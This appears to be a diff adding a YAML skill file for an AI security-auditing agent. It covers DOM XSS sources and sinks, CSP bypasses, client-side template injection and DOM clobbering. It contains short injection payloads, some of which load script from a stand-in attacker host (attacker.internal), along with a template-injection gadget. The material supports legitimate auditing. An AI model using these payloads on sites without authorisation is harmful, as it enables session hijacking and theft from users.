@@ -1,0 +1,67 @@
+schema_version: 1
+version: 3.0.0
+name: modern-xss-csp
+description: Senior DOM-based Cross-Site Scripting (XSS), Content Security Policy (CSP) bypasses, client-side template injection (CSTI), and DOM clobbering.
+triggers:
+  - xss
+  - dom xss
+  - csp
+  - content security policy
+  - csp bypass
+  - csti
+  - dom clobbering
+  - innerhtml
+tools:
+  - curl
+knowledge: |
+  Audit client-side JavaScript execution flows, DOM sink dataflows, and Content Security Policy (CSP) enforcement with senior offensive engineering precision.
+
+  1. DOM XSS SOURCE-TO-SINK DATAFLOW:
+     DOM XSS occurs entirely within client-side JavaScript when untrusted input flows from an execution source to an execution sink without sanitization:
+     - Common Execution Sources:
+       `location.search` (query parameters), `location.hash` (fragment identifiers), `location.pathname`,
+       `document.referrer`, `window.name`, and `window.addEventListener("message", ...)` event data.
+     - Dangerous Execution Sinks:
+       • HTML / DOM Sinks: `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`, `element.insertAdjacentHTML()`.
+       • Script / Code Sinks: `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`.
+       • URL / Navigation Sinks: `location.href`, `location.assign()`, `location.replace()`, `<a href="...">`, `<iframe src="...">` (permitting `javascript:...` pseudo-protocols).
+
+  2. CONTENT SECURITY POLICY (CSP) EVALUATION & BYPASSES:
+     When an application deploys a `Content-Security-Policy` HTTP header, audit the policy directives for architectural bypasses:
+     - Permissive Directives:
+       • `'unsafe-inline'`: Completely removes protection against inline script execution and event handlers.
+       • `'unsafe-eval'`: Allows dynamic code generation, enabling template injection and parser gadgets.
+       • `data:` or `*` in `script-src`: Permits arbitrary script loading from inline data URIs or external origins.
+     - CDN Whitelist Bypasses (JSONP & Gadgets):
+       If `script-src` allows broad CDNs (`https://cdnjs.cloudflare.com`, `https://*.googleapis.com`):
+       Look for hosted JSONP endpoints or outdated libraries (e.g. AngularJS) on the whitelisted CDN to construct executable gadgets that bypass the origin whitelist.
+     - Base-URI Injection:
+       If `base-uri` is missing or set to `'self'`:
+       Injecting `<base href="https://attacker.internal/">` causes the browser to fetch all relative script references (`<script src="/js/app.js">`) from the attacker's host.
+     - Nonce Reuse in Cached Responses:
+       Verify whether static or reverse-proxy caching returns identical `nonce="<value>"` tokens across multiple independent client requests.
+
+  3. CLIENT-SIDE TEMPLATE INJECTION (CSTI):
+     When applications embed user input into templates rendered dynamically by frontend frameworks (Vue.js, AngularJS, Alpine.js, Moustache):
+     - Vue.js / AngularJS Expression Evaluation:
+       `{{constructor.constructor('console.log(1)')()}}`
+     - Alpine.js x-data Injection:
+       `x-data="{...}"` containing unescaped server-rendered text.
+
+  4. DOM CLOBBERING:
+     Injecting HTML markup with specific `id` or `name` attributes to overwrite browser global variables or object properties:
+     - Named Anchor Clobbering:
+       `<a id="config" href="https://attacker.internal/app.js">`
+       Causes `window.config` to resolve to the DOM node instead of undefined, poisoning script loader logic:
+       `script.src = window.config.url || "/default.js";`
+     - Form Element Clobbering:
+       `<form id="userData"><input name="avatar" value="canary">`
+
+  5. VERIFICATION STANDARDS & SAFETY:
+     - Demonstrate execution using benign, verifiable proof-of-concept markers: `console.log("XSS_CANARY")`, `document.title = "CANARY"`.
+     - Document the source, sink, CSP directive gaps, and full execution trace deterministically.
+references:
+  - persona:modern-xss-csp-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/modern-xss-csp.yaml
